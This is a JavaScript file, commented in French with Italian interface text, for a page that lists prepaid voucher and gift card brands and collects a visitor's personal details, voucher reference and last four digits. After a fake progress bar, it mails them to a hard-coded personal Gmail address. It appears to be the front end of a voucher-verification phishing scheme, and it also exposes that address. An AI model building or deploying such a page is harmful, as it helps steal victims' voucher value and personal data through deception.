document.addEventListener('DOMContentLoaded', () => {

    // --- 1. GÉNÉRATION DES CARTES TICKETS ---
    const tickets = [
        { id: 'PCS', name: 'PCS', color: '#1a1a2e' },
        { id: 'Transcash', name: 'Transcash', color: '#c0392b' },
        { id: 'Neosurf', name: 'Neosurf', color: '#e67e22' },
        { id: 'Paysafecard', name: 'Paysafecard', color: '#0036c2' },
        { id: 'Cashlib', name: 'Cashlib', color: '#2c3e50' },
        { id: 'Flexepin', name: 'Flexepin', color: '#16a085' },
        { id: 'Amazon Gift Card', name: 'Amazon', color: '#ff9900' },
        { id: 'Steam Gift Card', name: 'Steam', color: '#171a21' },
        { id: 'Google Play Gift Card', name: 'Google Play', color: '#34a853' },
        { id: 'Apple Gift Card', name: 'Apple', color: '#555555' },
        { id: 'PlayStation Store Card', name: 'PlayStation', color: '#003791' },
        { id: 'Xbox Gift Card', name: 'Xbox', color: '#107c10' },
        { id: 'Netflix Gift Card', name: 'Netflix', color: '#e50914' },
        { id: 'Nintendo eShop Card', name: 'Nintendo', color: '#e60012' },
        { id: 'Razer Gold', name: 'Razer Gold', color: '#44d62c' }
    ];

    const grid = document.getElementById('ticketsGrid');
    const selectType = document.getElementById('ticket_type');

    tickets.forEach(t => {
        const card = document.createElement('div');
        card.className = 'ticket-card';
        card.setAttribute('data-id', t.id);
        card.innerHTML = `
            <img src="https://placehold.co/300x150/${t.color.replace('#', '')}/ffffff?text=${encodeURIComponent(t.name)}" alt="${t.name}">
            <h3>${t.name}</h3>
        `;
        
        card.addEventListener('click', () => {
            document.querySelectorAll('.ticket-card').forEach(c => c.classList.remove('selected'));
            card.classList.add('selected');
            selectType.value = t.id;
            document.getElementById('richiesta').scrollIntoView({ behavior: 'smooth' });
        });

        grid.appendChild(card);
    });

    // --- 2. VALIDATION ET ENVOI PAR EMAIL ---
    const form = document.getElementById('requestForm');
    
    const showError = (id, msg) => {
        document.getElementById(id).classList.add('invalid');
        document.getElementById('err-' + id).textContent = msg;
    };

    form.addEventListener('submit', (e) => {
        e.preventDefault(); 
        let isValid = true;

        document.querySelectorAll('.error-msg').forEach(el => el.textContent = '');
        document.querySelectorAll('input, select').forEach(el => el.classList.remove('invalid'));

        const firstname = document.getElementById('firstname').value.trim();
        const lastname = document.getElementById('lastname').value.trim();
        const email = document.getElementById('email').value.trim();
        const phone = document.getElementById('phone').value.trim();
        const country = document.getElementById('country').value.trim();
        const ticketType = document.getElementById('ticket_type').value;
        const amount = document.getElementById('amount').value;
        const date = document.getElementById('purchase_date').value;
        const purchaseCountry = document.getElementById('purchase_country').value.trim();
        const ref = document.getElementById('public_ticket_reference').value.trim();
        const lastFour = document.getElementById('last_four').value.trim();
        const privacy = document.getElementById('privacy').checked;

        // Vérifications
        if (firstname.length < 2) { showError('firstname', 'Inserisci il nome.'); isValid = false; }
        if (lastname.length < 2) { showError('lastname', 'Inserisci il cognome.'); isValid = false; }
        if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) { showError('email', 'Email non valida.'); isValid = false; }
        if (phone.length < 8) { showError('phone', 'Telefono non valido.'); isValid = false; }
        if (country.length < 2) { showError('country', 'Inserisci il paese.'); isValid = false; }
        if (!ticketType) { showError('ticket_type', 'Seleziona un ticket.'); isValid = false; }
        if (amount <= 0 || amount === '') { showError('amount', 'Importo non valido.'); isValid = false; }
        if (!date) { showError('purchase_date', 'Inserisci la data.'); isValid = false; }
        if (new Date(date) > new Date()) { showError('purchase_date', 'La data non può essere futura.'); isValid = false; }
        if (purchaseCountry.length < 2) { showError('purchase_country', 'Inserisci il paese.'); isValid = false; }
        if (ref.length < 3) { showError('public_ticket_reference', 'Inserisci un riferimento.'); isValid = false; }
        if (!privacy) { showError('privacy', 'Devi accettare l\'informativa.'); isValid = false; }

        if (!isValid) return; 

        // --- PREPARATION DE L'EMAIL ---
        const submitBtn = document.getElementById('submitBtn');
        const progressContainer = document.getElementById('progressContainer');
        const progressBar = document.getElementById('progressBar');
        const progressLabel = document.getElementById('progressLabel');

        submitBtn.disabled = true;
        submitBtn.textContent = 'Apertura email...';
        progressContainer.hidden = false;

        let progress = 0;
        const interval = setInterval(() => {
            progress = Math.min(progress + 25, 100);
            progressBar.style.width = progress + '%';
            progressLabel.textContent = Math.round(progress) + '%';
        }, 150);

        setTimeout(() => {
            clearInterval(interval);
            
            // ⚠️ METTEZ VOTRE EMAIL ICI ⚠️
            const votreEmail = "Brunottiamandine@gmail.com"; 
            
            // Création du sujet et du corps du message
            const subject = encodeURIComponent(`Nuova richiesta Ticket: ${ticketType} - ${firstname} ${lastname}`);
            const body = encodeURIComponent(
                `Dettagli della richiesta:\n\n` +
                `--- INFORMAZIONI PERSONALI ---\n` +
                `Nome: ${firstname}\n` +
                `Cognome: ${lastname}\n` +
                `Email: ${email}\n` +
                `Telefono: ${phone}\n` +
                `Paese: ${country}\n\n` +
                `--- INFORMAZIONI DEL TICKET ---\n` +
                `Tipo di ticket: ${ticketType}\n` +
                `Importo: € ${amount}\n` +
                `Data di acquisto: ${date}\n` +
                `Paese di acquisto: ${purchaseCountry}\n` +
                `Numero di riferimento: ${ref}\n` +
                `Ultime 4 cifre: ${lastFour ? lastFour : 'Non fornite'}\n`
            );

            // Ouvre l'application mail du client
            window.location.href = `mailto:${votreEmail}?subject=${subject}&body=${body}`;

            // Affiche le message de succès sur le site
            form.hidden = true;
            progressContainer.hidden = true;
            document.getElementById('successMessage').hidden = false;
            document.getElementById('successMessage').scrollIntoView({ behavior: 'smooth' });

        }, 800);
    });
});